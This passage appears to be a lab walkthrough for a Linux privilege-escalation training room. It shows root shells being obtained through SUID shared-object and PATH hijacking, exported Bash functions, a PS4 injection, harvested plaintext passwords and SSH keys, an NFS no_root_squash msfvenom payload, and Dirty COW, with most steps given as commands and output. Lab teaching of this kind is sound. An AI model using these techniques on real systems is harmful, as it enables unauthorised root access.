Note that the executable tries to load the **/home/user/.config/libcalc.so** shared object within our home directory, but it cannot be found.

Create the **.config** directory for the libcalc.so file:

`mkdir /home/user/.config`

Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

Execute the **suid-so** executable again, and note that this time, instead of a progress bar, we get a root shell.

`/usr/local/bin/suid-so`

**Remember to exit out of the root shell before continuing!**

```
user@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
user@debian:~$
```

```
user@debian:~$ mkdir /home/user/.config
user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
user@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# whoami
root
bash-4.1#
```

1. Read and follow along with the above.

`No answer needed`

## SUID / SGID Executables - Environment Variables

The **/usr/local/bin/suid-env** executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:

`/usr/local/bin/suid-env`

Run strings on the file to look for strings of printable characters:

`strings /usr/local/bin/suid-env`

One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

Compile the code located at **/home/user/tools/suid/service.c** into an executable called **service**. This code simply spawns a Bash shell:

`gcc -o service /home/user/tools/suid/service.c`

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the **suid-env** executable to gain a root shell:

`PATH=.:$PATH /usr/local/bin/suid-env`

**Remember to exit out of the root shell before continuing!**

```
user@debian:~$ /usr/local/bin/suid-env
[....] Starting web server: apache2httpd (pid 1479) already running
. ok
user@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
user@debian:~$ gcc -o service /home/user/tools/suid/service.c
user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
root@debian:~# whoami
root
root@debian:~#
```

1. Read and follow along with the above.

`No answer needed`

## SUID / SGID Executables - Abusing Shell Features (#1)

The **/usr/local/bin/suid-env2** executable is identical to **/usr/local/bin/suid-env** except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:

`strings /usr/local/bin/suid-env2`

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:

`/bin/bash --version`

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

Run the **suid-env2** executable to gain a root shell:

`/usr/local/bin/suid-env2`

**Remember to exit out of the root shell before continuing!**

1. Read and follow along with the above.

```
user@debian:~$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
user@debian:~$ /bin/bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
user@debian:~$ export -f /usr/sbin/service
user@debian:~$ /usr/local/bin/suid-env2
root@debian:~# whoami
root
root@debian:~#
```

`No answer needed`

## SUID / SGID Executables - Abusing Shell Features (#2)

Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.

Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

**Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!**

```
rm /tmp/rootbash
exit
```

1. Read and follow along with the above.

```
user@debian:~$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/usr/sbin/service apache2 start
basename /usr/sbin/service
VERSION='service ver. 0.91-ubuntu1'
basename /usr/sbin/service
USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
SERVICE=
ACTION=
SERVICEDIR=/etc/init.d
OPTIONS=
'[' 2 -eq 0 ']'
cd /
'[' 2 -gt 0 ']'
case "${1}" in
'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
'[' 2 -eq 2 -a start = --full-restart ']'
'[' -z '' ']'
SERVICE=apache2
shift
'[' 1 -gt 0 ']'
case "${1}" in
'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
'[' 1 -eq 2 -a '' = --full-restart ']'
'[' -z apache2 ']'
'[' -z '' ']'
ACTION=start
shift
'[' 0 -gt 0 ']'
'[' -r /etc/init/apache2.conf ']'
'[' -x /etc/init.d/apache2 ']'
exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1479) already running
.
user@debian:~$ /tmp/rootbash -p
rootbash-4.1# whoami
root
rootbash-4.1# rm /tmp/rootbash
rootbash-4.1# exit
exit
user@debian:~$
```

`No answer needed`

## Passwords & Keys - History Files

If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:

`cat ~/.*history | less`

Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!

Switch to the root user, using the password:

`su root`

**Remember to exit out of the root shell before continuing!**

```
cat ~/.*history | less

ls -al
cat .bash_history
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
nano myvpn.ovpn
ls
whoami
exit
whoami
exit
whoami
exit
whoami
```

1. What is the full mysql command the user executed?

`mysql -h somehost.local -uroot -ppassword123`

## Passwords & Keys - Config Files

Config files often contain passwords in plaintext or other reversible formats.

List the contents of the user's home directory:

`ls /home/user`

Note the presence of a myvpn.ovpn config file. View the contents of the file:

`cat /home/user/myvpn.ovpn`

The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:

`su root`

**Remember to exit out of the root shell before continuing!**

1. What file did you find the root user's credentials in?

```
user@debian:~$ ls /home/user
]  myvpn.ovpn  service  tools
user@debian:~$ cat /home/user/myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

user@debian:~$ cat /etc/openvpn/auth.txt
root
password123
user@debian:~$
```

`/etc/openvpn/auth.txt`

## Passwords & Keys - SSH Keys

Sometimes users make backups of important files but fail to secure them with the correct permissions.

Look for hidden files & directories in the system root:

`ls -la /`

Note that there appears to be a hidden directory called **.ssh**. View the contents of the directory:

`ls -l /.ssh`

Note that there is a world-readable file called **root_key**. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

Copy the key over to your Kali box (it's easier to just view the contents of the **root_key** file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:

`chmod 600 root_key`

Use the key to login to the Debian VM as the root account (change the IP accordingly):

`ssh -i root_key root@10.10.10.10`

**Remember to exit out of the root shell before continuing!**

1. Read and follow along with the above.

`No answer needed`

## NFS

Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

`cat /etc/exports`

Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

`sudo su`

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

```
mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
```

Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):

`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`

Still using Kali's root user, make the file executable and set the SUID permission:

`chmod +xs /tmp/nfs/shell.elf`

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

`/tmp/shell.elf`

**Remember to exit out of the root shell before continuing!**

1. What is the name of the option that disables root squashing?

- [NFS, no_root_squash and SUID - Basic NFS Security](http://fullyautolinux.blogspot.com/2015/11/nfs-norootsquash-and-suid-basic-nfs.html)

`no_root_squash`

## Kernel Exploits

Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

Run the **Linux Exploit Suggester 2** tool to identify potential kernel exploits on the current system:

`perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`

The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at **/home/user/tools/kernel-exploits/dirtycow/c0w.c**. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

Compile the code and run it (note that it may take several minutes to complete):

```
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```

Once the exploit completes, run /usr/bin/passwd to gain a root shell:

`/usr/bin/passwd`

Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!

```
mv /tmp/bak /usr/bin/passwd
exit
```

1. Read and follow along with the above.

`No answer needed`

## Privilege Escalation Scripts

Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory: **/home/user/tools/privesc-scripts**

1. Experiment with all three tools, running them with different options. Do all of them identify the techniques used in this room?

`No answer needed`
